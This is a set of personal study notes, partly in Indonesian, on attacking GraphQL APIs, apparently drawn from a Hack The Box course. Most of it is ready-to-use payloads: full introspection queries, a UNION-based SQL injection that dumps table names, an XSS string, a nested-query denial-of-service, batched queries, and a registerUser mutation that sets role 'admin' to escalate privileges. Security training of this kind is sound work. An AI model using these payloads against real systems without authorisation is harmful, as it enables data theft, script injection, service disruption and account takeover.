# Attacking GraphQL
## basic
```json
{
  users {
    id
    username
    role
  }
}

{
  users(username: "admin") {
    id
    username
    role
    password // bisa ditambah!!
  }
}
```

Tool: [graphw00f]([dolevf/graphw00f: graphw00f is GraphQL Server Engine Fingerprinting utility for software security professionals looking to learn more about what technology is behind a given GraphQL endpoint.](https://github.com/dolevf/graphw00f))

## Introspection

identify all GraphQL types supported by the backend
```json
{
  __schema {
    types {
      name
    }
  }
}
```

follow up and obtain the name of all of the type's fields. ganti UserObject jadi jenis object apapun
```json
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

obtain all the queries supported by the backend
```json
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

general introspection
```json
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

## Attacks

### IDOR

obvious

### SQLi
```json
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

### XSS
obvious
```json
{
	"query": "{user(username: \"<script>alert(1)</script>\") {uuid username role}}"
}
```

### DoS
```json
{
  posts {
    author {
      posts {
        edges {
          node {
          ...
```

### Batching Attacks
executing multiple queries with a single request
```json
[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

## Mutation
GraphQL queries that modify server data
```json
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
 
Identify from mutation, which object can be mutated.

![](https://academy.hackthebox.com/storage/modules/271/mutation_1.png)
 
Use introspection to get object data type, then try to register

```json
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

As role admin 

```json
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

## Tools

1. graphw00f
2. [GraphQL-Cop](https://github.com/dolevf/graphql-cop)
3. InQL (Burp Extension)